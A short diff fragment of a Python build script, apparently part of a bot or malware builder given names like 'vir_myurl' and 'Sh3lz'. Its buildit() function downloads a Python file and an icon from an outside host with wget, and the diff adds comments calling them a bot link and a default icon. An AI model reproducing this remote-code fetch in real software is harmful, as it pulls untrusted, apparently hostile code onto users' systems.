@@ -613,7 +613,9 @@ def build():
         return vir_myurl
 
     def buildit():
+        # Bot.py -- auxiliary link
         wget.download('http://zepikao.my3gb.com/Sh3lz/base.py')
+        # Default icon
         wget.download('http://zepikao.my3gb.com/Sh3lz/t.ico')
         texthe = '''
 #! python2
